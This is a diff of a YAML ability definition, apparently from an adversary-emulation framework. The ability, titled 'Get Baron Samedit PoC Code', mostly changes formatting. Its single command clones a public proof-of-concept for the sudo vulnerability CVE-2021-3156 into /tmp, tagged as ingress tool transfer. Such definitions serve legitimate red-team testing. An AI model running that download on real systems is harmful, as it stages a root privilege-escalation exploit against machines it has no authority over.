@@ -1,10 +1,11 @@
-- description: Grab Blasty's PoC
-  id: 797e1120-1acf-4d7e-905b-9e903e5fd0c7
+---
+- id: 797e1120-1acf-4d7e-905b-9e903e5fd0c7
+  description: Grab Blasty's PoC from Github
   name: Get Baron Samedit PoC Code
   platforms:
     linux:
       sh:
-        command: 'git clone https://github.com/blasty/CVE-2021-3156.git /tmp/CVE-2021-3156'
+        command: "git clone https://github.com/blasty/CVE-2021-3156.git /tmp/CVE-2021-3156"
   tactic: command-and-control
   technique:
     attack_id: T1105
